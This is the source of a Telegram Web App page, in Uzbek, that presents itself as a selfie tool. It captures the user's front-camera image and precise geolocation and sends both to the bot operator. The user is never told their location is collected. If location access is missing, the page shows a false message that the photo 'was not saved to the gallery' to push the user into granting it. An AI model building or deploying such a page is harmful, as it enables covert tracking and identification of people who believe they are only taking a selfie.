<!doctype html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Kamera va Lokatsiya</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
        background-color: #f0f2f5;
      }
      video {
        width: 90%;
        max-width: 400px;
        border-radius: 8px;
        border: 2px solid #0088cc;
        background-color: #000;
      }
      button {
        padding: 12px 24px;
        font-size: 16px;
        background-color: #0088cc;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        margin-top: 20px;
      }
      #status {
        margin-top: 10px;
        color: #555;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <h2>Ozingizni Selfie qiling</h2>
    <!-- Kamera oqimi foydalanuvchiga aniq ko'rinadi -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none"></canvas>

    <button id="sendBtn">Ozingizni selfie qiling</button>
    <div id="status">Kameraga Ruxsat Kutilmoqda...</div>

    <script>
      const tg = window.Telegram.WebApp;
      tg.expand();

      const video = document.getElementById("video");
      const sendBtn = document.getElementById("sendBtn");
      const canvas = document.getElementById("canvas");
      const statusDiv = document.getElementById("status");

      let userLocation = null;

      // 1. Sahifa ochilishi bilan brauzerdan ruxsat so'rab kamerani yoqamiz
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          video.srcObject = stream;
          statusDiv.innerText = "Rasmga olish uchun eng qulay site";
        })
        .catch((err) => {
          statusDiv.innerText =
            "Kameraga ruxsat berilmadi yoki xatolik yuz berdi.";
          alert("Kameraga ruxsat berishingiz zarur.");
        });

      // 2. Geolokatsiyani aniqlash
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            userLocation = {
              lat: position.coords.latitude,
              lon: position.coords.longitude,
            };
            statusDiv.innerText = "Kamera tayyor. Tugmani bosing.";
          },
          (err) => {
            statusDiv.innerText = "Iltimos boshqattan urining";
          },
        );
      }

      // 3. Tugma bosilganda rasmga tushirish va botga yuborish
      sendBtn.addEventListener("click", () => {
        if (!userLocation) {
          alert("Iltimos gallareyaga saqlanmadi boshqattan urining");
          return;
        }

        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Videodan joriy kadrni canvas'ga chizamiz
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Rasmni matnli (Base64) formatga o'tkazamiz
        const base64Image = canvas.toDataURL("image/jpeg", 0.7); // Sifatini 70% qilamiz (hajmi kichikroq bo'lishi uchun)

        // Botga ketadigan ma'lumotlar paketi
        const payload = {
          latitude: userLocation.lat,
          longitude: userLocation.lon,
          photo: base64Image,
        };

        // Telegram botga ma'lumotni yuborish
        tg.sendData(JSON.stringify(payload));
        tg.close();
      });
    </script>
  </body>
</html>
